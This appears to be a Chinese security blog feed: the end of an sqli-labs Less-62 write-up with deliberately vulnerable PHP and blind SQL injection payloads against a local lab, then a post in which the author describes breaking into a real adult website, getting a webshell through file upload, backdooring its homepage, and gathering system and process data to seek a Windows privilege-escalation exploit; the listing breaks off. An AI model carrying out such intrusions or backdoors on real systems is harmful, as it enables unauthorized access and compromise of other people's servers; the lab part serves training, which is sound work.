class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html <span class="keyword">PUBLIC</span> <span class="string">"-//W3C//DTD XHTML 1.0 Transitional//EN"</span> <span class="string">"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"</span>&gt;</span><br><span class="line">&lt;html xmlns=<span class="string">"http://www.w3.org/1999/xhtml"</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Type"</span> content=<span class="string">"text/html; charset=utf-8"</span> /&gt;</span><br><span class="line">&lt;title&gt;Less<span class="number">-62</span>:Challenge<span class="number">-9</span>&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body bgcolor=<span class="string">"#000000"</span>&gt;</span><br><span class="line">&lt;div style =<span class="string">"text-align:right"</span>&gt;</span><br><span class="line">&lt;form action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">&lt;input  type=<span class="string">"submit"</span> name=<span class="string">"reset"</span> value=<span class="string">"Reset the Challenge!"</span> /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;/div&gt;</span><br><span class="line">&lt;/right&gt;</span><br><span class="line">&lt;div style=<span class="string">" margin-top:20px;color:#FFF; font-size:23px; text-align:center"</span>&gt;Welcome&amp;nbsp;&amp;nbsp;&amp;nbsp;&lt;font color=<span class="string">"#FF0000"</span>&gt; Dhakkan &lt;/font&gt;&lt;br&gt;</span><br><span class="line">&lt;font size=<span class="string">"3"</span> color=<span class="string">"#FFFF00"</span>&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/sql-connect-1.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../sql-connections/functions.php'</span>;</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$pag = $_SERVER[<span class="string">'PHP_SELF'</span>]; <span class="comment">//generating page address to piggy back after redirects...</span></span><br><span class="line">$characters = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'</span>; <span class="comment">//characterset for generating random data</span></span><br><span class="line">$times= <span class="number">130</span>;</span><br><span class="line">$table = table_name();</span><br><span class="line">$col = column_name(<span class="number">1</span>);     <span class="comment">// session id column name</span></span><br><span class="line">$col1 = column_name(<span class="number">2</span>);   <span class="comment">//secret key column name</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Submitting the final answer</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_POST[<span class="string">'answer_key'</span>]))</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// resetting the challenge and repopulating the table .</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">'reset'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have reset the Challenge&lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to main challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="comment">//echo "cookie expired";</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// Checking the cookie on the page and populate the table with random value.</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_COOKIE[<span class="string">'challenge'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$sessid=$_COOKIE[<span class="string">'challenge'</span>];</span><br><span class="line"><span class="comment">//echo "Cookie value: ".$sessid;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">$expire = time()+<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">30</span>;</span><br><span class="line">$hash = data($table,$col);</span><br><span class="line">setcookie(<span class="string">"challenge"</span>, $hash, $expire);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// take the variables</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//update the counter in database</span></span><br><span class="line">next_tryy();</span><br><span class="line"></span><br><span class="line"><span class="comment">//Display attempts on screen.</span></span><br><span class="line">$tryyy = view_attempts();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"You have made : "</span>. $tryyy .<span class="string">" of $times attempts"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;br&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//Reset the Database if you exceed allowed attempts.</span></span><br><span class="line"><span class="keyword">if</span>($tryyy &gt;= ($times+<span class="number">1</span>))</span><br><span class="line">&#123;</span><br><span class="line">setcookie(<span class="string">'challenge'</span>, <span class="string">' '</span>, time() - <span class="number">3600000</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font size=4&gt;You have exceeded maximum allowed attempts, Hence Challenge Has Been Reset &lt;/font&gt;&lt;br&gt;\n"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Redirecting you to challenge page..........\n"</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> );</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// Querry DB to get the correct output</span></span><br><span class="line">$sql=<span class="string">"SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1"</span>;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#00FFFF"&gt;'</span>;</span><br><span class="line">$unames=<span class="keyword">array</span>(<span class="string">"Dumb"</span>,<span class="string">"Angelina"</span>,<span class="string">"Dummy"</span>,<span class="string">"secure"</span>,<span class="string">"stupid"</span>,<span class="string">"superman"</span>,<span class="string">"batman"</span>,<span class="string">"admin"</span>,<span class="string">"admin1"</span>,<span class="string">"admin2"</span>,<span class="string">"admin3"</span>,<span class="string">"dhakkan"</span>,<span class="string">"admin4"</span>);</span><br><span class="line">$pass = array_reverse($unames);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Login name : '</span>. $unames[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'Your Password : '</span> .$pass[$row[<span class="string">'id'</span>]];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value as done in  Lab excercises\n&lt;br&gt;&lt;br&gt;\n&lt;/font&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;font color='#00FFFF': size=3&gt;The objective of this challenge is to dump the &lt;b&gt;(secret key)&lt;/b&gt; from only random table from Database &lt;b&gt;&lt;i&gt;('CHALLENGES')&lt;/i&gt;&lt;/b&gt; in Less than $times attempts&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"For fun, with every reset, the challenge spawns random table name, column name, table data. Keeping it fresh at all times.&lt;br&gt;"</span> ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;/font&gt; &lt;/div&gt;&lt;/br&gt;&lt;/br&gt;&lt;/br&gt;&lt;center&gt;</span><br><span class="line">&lt;img src=<span class="string">"../images/Less-62.jpg"</span> /&gt;</span><br><span class="line">&lt;/center&gt;</span><br><span class="line">&lt;br&gt;&lt;br&gt;&lt;br&gt;</span><br><span class="line">&lt;div  style=<span class="string">" color:#00FFFF; font-size:18px; text-align:center"</span>&gt;</span><br><span class="line">&lt;form name=<span class="string">"input"</span> action=<span class="string">""</span> method=<span class="string">"post"</span>&gt;</span><br><span class="line">Submit Secret Key: &lt;input type=<span class="string">"text"</span> name=<span class="string">"key"</span>&gt;</span><br><span class="line">&lt;input type=<span class="string">"submit"</span> name = <span class="string">"answer_key"</span> value=<span class="string">"Submit"</span>&gt;</span><br><span class="line">&lt;/form&gt; </span><br><span class="line">&lt;/div&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;div  style=" color:#00FFFF; font-size:18px; text-align:center"&gt;'</span>;</span><br><span class="line">$key = addslashes($_POST[<span class="string">'key'</span>]);</span><br><span class="line">$key = mysql_real_escape_string($key);</span><br><span class="line"><span class="comment">//echo $key;</span></span><br><span class="line"><span class="comment">//Query table to verify your result</span></span><br><span class="line">$sql=<span class="string">"SELECT 1 FROM $table WHERE $col1= '$key'"</span>;</span><br><span class="line"><span class="comment">//echo "$sql";</span></span><br><span class="line">$result=mysql_query($sql)<span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">"error in submittion of Key Solution"</span>.mysql_error());</span><br><span class="line"> </span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/Less-54-1.jpg" /&gt;'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">header( <span class="string">"refresh:4;url=../sql-connections/setup-db-challenge.php?id=$pag"</span> ); </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"\n&lt;br&gt;&lt;br&gt;&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;img src="../images/slap1.jpg" /&gt;'</span>;</span><br><span class="line">header( <span class="string">"refresh:3;url=index.php"</span> );</span><br><span class="line"><span class="comment">//print_r(mysql_error());</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>闭合方式变了，不输出mysql报错，无法报错注入，只能盲注了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(length(database())=10)</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/02/24/k4ukd0.png" alt="k4ukd0.png"></p><p>payload如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(1=(select%20count(table_name)%20from%20information_schema.tables%20where%20table_schema=%22challenges%22))%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20limit%200,1),10,1)))%20--+</span><br><span class="line">然后跑表名，然后跑列名：</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(ascii(substr((select%20table_name%20from%20information_schema.tables%20where%20table_schema=%22challenges%22%20limit%200,1),1,1))=104)%20--+</span><br><span class="line">http://127.0.0.1/sqli-labs-master/Less-62/?id=1%27)%20and(ascii(substr((select%20column_name%20from%20information_schema.columns%20where%20table_name=%22hjvgjkpvnm%22%20limit%200,1),1,1)))--+</span><br><span class="line">略过...........</span><br></pre></td></tr></table></figure></p><p>第63关-65关都是盲注…,这里就不重复了</p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Write a privilege</title>
      <link href="/posts/88e0ff63.html"/>
      <url>/posts/88e0ff63.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>今天和某位基友交流然后谈了一些东西后，日了某黄网 。拿到shell后原本想就这样吧，但是后面想练习提权。<br><img src="https://p4.ssl.cdn.btime.com/t01cfe6fae2c55f39f2.jpg?size=900x600" alt="t01cfe6fae2c55f39f2.jpg?size=900x600"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p>通过任意文件上传得到webshell<br><img src="https://s2.ax1x.com/2019/02/23/khOPbt.png" alt="khOPbt.png"></p><p>但是这个webshell并不是很好用，通过webshell下载黄网的主页在里面添加后门。然后连接到菜刀<br><img src="https://s2.ax1x.com/2019/02/23/khvSv4.png" alt="khvSv4.png"></p><p>查看权限<br><img src="https://s2.ax1x.com/2019/02/23/khOlV0.png" alt="khOlV0.png"></p><p>进行一系列信息收集<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipconfig</span><br><span class="line">netstat -ano</span><br><span class="line">tasklist /svc</span><br><span class="line">systeminfo</span><br><span class="line">net localgroup</span><br><span class="line">net user</span><br></pre></td></tr></table></figure></p><p>将目标打的补丁贴到这里：<a href="https://bugs.hacking8.com" target="_blank" rel="noopener">提权辅助网页</a><br>发现存在MS15-015提权<br><img src="https://s2.ax1x.com/2019/02/23/khO2Md.png" alt="khO2Md.png"></p><p>信息如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line">权限：iis apppool\ugwyahx.com</span><br><span class="line">用户：Administrator            Guest     </span><br><span class="line">打了的补丁：</span><br><span class="line">主机名:           WIN-KSQJUD5F488</span><br><span class="line">OS 名称:          Microsoft Windows Server 2012 R2 Standard</span><br><span class="line">OS 版本:          6.3.9600 暂缺 Build 9600</span><br><span class="line">OS 制造商:        Microsoft Corporation</span><br><span class="line">OS 配置:          独立服务器</span><br><span class="line">OS 构件类型:      Multiprocessor Free</span><br><span class="line">注册的所有人:     Windows 用户</span><br><span class="line">注册的组织:       </span><br><span class="line">产品 ID:          00252-70000-00000-AA535</span><br><span class="line">初始安装日期:     2018/9/15, 10:57:30</span><br><span class="line">系统启动时间:     2018/9/16, 21:33:38</span><br><span class="line">系统制造商:       Supermicro</span><br><span class="line">系统型号:         SYS-5038ML-H8TRF</span><br><span class="line">系统类型:         x64-based PC</span><br><span class="line">处理器:           安装了 1 个处理器。</span><br><span class="line">                  [01]: Intel64 Family 6 Model 60 Stepping 3 GenuineIntel ~800 Mhz</span><br><span class="line">BIOS 版本:        American Megatrends Inc. 3.0a, 2015/12/17</span><br><span class="line">Windows 目录:     C:\Windows</span><br><span class="line">系统目录:         C:\Windows\system32</span><br><span class="line">启动设备:         \Device\HarddiskVolume1</span><br><span class="line">系统区域设置:     zh-cn;中文(中国)</span><br><span class="line">输入法区域设置:   zh-cn;中文(中国)</span><br><span class="line">时区:             (UTC+08:00)北京，重庆，香港特别行政区，乌鲁木齐</span><br><span class="line">物理内存总量:     8,151 MB</span><br><span class="line">可用的物理内存:   6,763 MB</span><br><span class="line">虚拟内存: 最大值: 10,071 MB</span><br><span class="line">虚拟内存: 可用:   8,550 MB</span><br><span class="line">虚拟内存: 使用中: 1,521 MB</span><br><span class="line">页面文件位置:     C:\pagefile.sys</span><br><span class="line">域:               WORKGROUP</span><br><span class="line">登录服务器:       暂缺</span><br><span class="line">修补程序:         安装了 3 个修补程序。</span><br><span class="line">                  [01]: KB2883200</span><br><span class="line">                  [02]: KB2894029</span><br><span class="line">                  [03]: KB2894179</span><br><span class="line">网卡:             安装了 2 个 NIC。</span><br><span class="line">                  [01]: Intel(R) I350 千兆网络连接</span><br><span class="line">                      连接名:      以太网</span><br><span class="line">                      状态:        媒体连接已中断</span><br><span class="line">                  [02]: Intel(R) I350 千兆网络连接</span><br><span class="line">                      连接名:      以太网 2</span><br><span class="line">                      启用 DHCP:   否</span><br><span class="line">                      IP 地址</span><br><span class="line">                        [01]: xxx.xxx.xxx.xx</span><br><span class="line">                        [02]: xxx.xxx.xxx.xx</span><br><span class="line">                        [03]: xxx.xxx.xxx.xx</span><br><span class="line">                        [04]: xxx.xxx.xxx.xx</span><br><span class="line">                        [05]: fe80::a0f8:34f0:c917:156a</span><br><span class="line">Hyper-V 要求:     虚拟机监视器模式扩展: 是</span><br><span class="line">                  固件中已启用虚拟化: 是</span><br><span class="line">                  二级地址转换: 是</span><br><span class="line">                  数据执行保护可用: 是</span><br><span class="line"></span><br><span class="line">运行的进程：</span><br><span class="line">映像名称                       PID 服务                                        </span><br><span class="line">========================= ======== ============================================</span><br><span class="line">System Idle Process              0 暂缺                                        </span><br><span class="line">System                           4 暂缺                                        </span><br><span class="line">smss.exe                       280 暂缺                                        </span><br><span class="line">csrss.exe                      388 暂缺                                        </span><br><span class="line">csrss.exe                      444 暂缺                                        </span><br><span class="line">wininit.exe                    452 暂缺                                        </span><br><span class="line">winlogon.exe                   504 暂缺                                        </span><br><span class="line">services.exe                   536 暂缺                                        </span><br><span class="line">lsass.exe                      544 SamSs                                       </span><br><span class="line">svchost.exe                    608 BrokerInfrastructure, DcomLaunch, LSM,      </span><br><span class="line">                                   PlugPlay, Power, SystemEventsBroker         </span><br><span class="line">svchost.exe                    660 RpcEptMapper, RpcSs                         </span><br><span class="line">LogonUI.exe                    736 暂缺                                        </span><br><span class="line">dwm.exe                        744 暂缺                                        </span><br><span class="line">svchost.exe                    760 Dhcp, EventLog, lmhosts, Wcmsvc             </span><br><span class="line">svchost.exe                    804 Appinfo, AppMgmt, BITS, CertPropSvc, gpsvc, </span><br><span class="line">                                   IKEEXT, iphlpsvc, LanmanServer, ProfSvc,    </span><br><span class="line">                                   Schedule, SENS, SessionEnv,                 </span><br><span class="line">                                   ShellHWDetection, Themes, Winmgmt           </span><br><span class="line">svchost.exe                    828 EventSystem, FontCache, netprofm, nsi       </span><br><span class="line">svchost.exe                    904 CryptSvc, Dnscache, LanmanWorkstation,      </span><br><span class="line">                                   NlaSvc, WinRM                               </span><br><span class="line">svchost.exe                    308 BFE, DPS, MpsSvc                            </span><br><span class="line">spoolsv.exe                   1032 Spooler                                     </span><br><span class="line">svchost.exe                   1056 AppHostSvc                                  </span><br><span class="line">svchost.exe                   1088 PolicyAgent                                 </span><br><span class="line">svchost.exe                   1116 Netman, TrkWks, UALSVC, UmRdpService        </span><br><span class="line">svchost.exe                   1132 W3SVC, WAS                                  </span><br><span class="line">svchost.exe                   1580 TermService                                 </span><br><span class="line">ChsIME.exe                    1984 暂缺                                        </span><br><span class="line">msdtc.exe                     1540 MSDTC                                       </span><br><span class="line">csrss.exe                      144 暂缺                                        </span><br><span class="line">winlogon.exe                  1956 暂缺                                        </span><br><span class="line">dwm.exe                       1304 暂缺                                        </span><br><span class="line">taskhostex.exe                2164 暂缺                                        </span><br><span class="line">rdpclip.exe                   2268 暂缺                                        </span><br><span class="line">ChsIME.exe                    2324 暂缺                                        </span><br><span class="line">explorer.exe                  2392 暂缺                                        </span><br><span class="line">DUMeterSvc.exe                3400 DUMeterSvc                                  </span><br><span class="line">DUMeter.exe                   3212 暂缺                                        </span><br><span class="line">phpStudy.exe                  3312 暂缺                                        </span><br><span class="line">mysqld.exe                    1548 MySQLa                                      </span><br><span class="line">notepad.exe                   3452 暂缺                                        </span><br><span class="line">mspaint.exe                   5068 暂缺                                        </span><br><span class="line">w3wp.exe                      4712 暂缺                                        </span><br><span class="line">w3wp.exe                      2788 暂缺                                        </span><br><span class="line">w3wp.exe                      2000 暂缺                                        </span><br><span class="line">w3wp.exe                      2344 暂缺                                        </span><br><span class="line">w3wp.exe                      4560 暂缺                                        </span><br><span class="line">w3wp.exe                      4556 暂缺                                        </span><br><span class="line">cmd.exe                       3444 暂缺                                        </span><br><span class="line">conhost.exe                   4888 暂缺                                        </span><br><span class="line">test.exe                      4356 暂缺                                        </span><br><span class="line">cmd.exe                       4600 暂缺                                        </span><br><span class="line">conhost.exe                   3620 暂缺                                        </span><br><span class="line">test.exe                      3648 暂缺                                        </span><br><span class="line">csrss.exe                     3160 暂缺                                        </span><br><span class="line">winlogon.exe                  2828 暂缺                                        </span><br><span class="line">dwm.exe                       2028 暂缺                                        